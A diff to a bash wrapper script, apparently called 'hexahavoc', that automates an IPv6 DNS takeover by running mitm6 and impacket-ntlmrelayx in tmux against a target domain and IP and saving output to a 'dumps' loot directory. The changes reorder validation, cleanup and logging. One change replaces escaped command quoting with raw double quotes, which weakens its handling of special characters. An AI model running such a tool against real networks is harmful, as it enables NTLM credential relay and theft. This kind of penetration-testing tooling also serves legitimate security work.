@@ -21,15 +21,8 @@ target_ip=""
 interface="eth0"
 verbose=0
 silent=0
-session_name="ipv6_dns_takeover_$(date +%H%M%S)"
+session_name="ipv6_dns_takeover"
 loot_dir="dumps"
-
-cleanup() {
-  echo -e "${YELLOW}Cleaning up session...${RESET}"
-  tmux kill-session -t "$session_name" 2>/dev/null || true
-}
-
-trap cleanup EXIT
 
 # Check if a command exists
 check_command() {
@@ -51,6 +44,12 @@ usage() {
   echo -e "  -s  Enable silent mode (suppress console output)"
   exit 1
 }
+
+# Check dependencies
+echo -e "${CYAN}Checking dependencies...${RESET}"
+check_command "tmux"
+check_command "mitm6"
+check_command "impacket-ntlmrelayx"
 
 # Banner function
 banner() {
@@ -81,12 +80,6 @@ while getopts ":d:t:i:l:vs" opt; do
   esac
 done
 
-# Root privilege check
-if [ "$EUID" -ne 0 ]; then
-  echo -e "${RED}Error: This script must be run as root.${RESET}"
-  exit 1
-fi
-
 # Ensure required arguments are provided
 if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
   echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
@@ -94,7 +87,7 @@ if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
 fi
 
 # Validate target domain
-if ! [ "$target_domain" =~ ^[a-zA-Z0-9.-]+$ ]; then
+if ! [[ "$target_domain" =~ ^[a-zA-Z0-9.-]+$ ]]; then
   echo -e "${RED}Error: Invalid domain format.${RESET}"
   exit 1
 fi
@@ -107,11 +100,28 @@ validate_ip() {
   fi
 }
 
+validate_ip "$target_ip"
+
 # Check if target IP is reachable
 ping -c 1 -W 2 "$target_ip" &>/dev/null || {
   echo -e "${RED}Error: Target IP is not reachable.${RESET}"
   exit 1
 }
+
+cleanup() {
+  if [[ $? -ne 0 ]]; then
+    echo -e "${YELLOW}Cleaning up session...${RESET}"
+    tmux kill-session -t "$session_name" 2>/dev/null || true
+  fi
+}
+
+trap cleanup EXIT
+
+# Root privilege check
+if [ "$EUID" -ne 0 ]; then
+  echo -e "${RED}Error: This script must be run as root.${RESET}"
+  exit 1
+fi
 
 # Create loot directory if it doesn't exist
 if [ ! -d "$loot_dir" ]; then
@@ -123,18 +133,11 @@ fi
 # Suppress console output if silent mode is enabled
 log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"
 
-if [ "$silent" -eq 1 ]; then
-  exec > >(tee -a "$log_file") 2>&1
-fi
+exec > >(tee -a "$log_file") 2>&1
+[[ "$silent" -eq 1 ]] && exec >/dev/null
 
 # Show the banner
 banner
-
-# Check dependencies
-echo -e "${CYAN}Checking dependencies...${RESET}"
-check_command "tmux"
-check_command "mitm6"
-check_command "impacket-ntlmrelayx"
 
 # Enable verbose logging if requested
 if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
@@ -179,8 +182,11 @@ start_tmux_window() {
   local session_name=$1
   local window_name=$2
   local command=$3
-  tmux new-window -t "$session_name" -n "$window_name"
-  tmux send-keys -t "$session_name:$window_name" "bash -lc $(printf '%q' "$command")" C-m
+  tmux new-window -t "$session_name" -n "$window_name" || {
+    echo "Failed to create window"
+    exit 1
+  }
+  tmux send-keys -t "$session_name:$window_name" "bash -lc \"$command\"" C-m
 }
 
 # Start mitm6 in tmux session
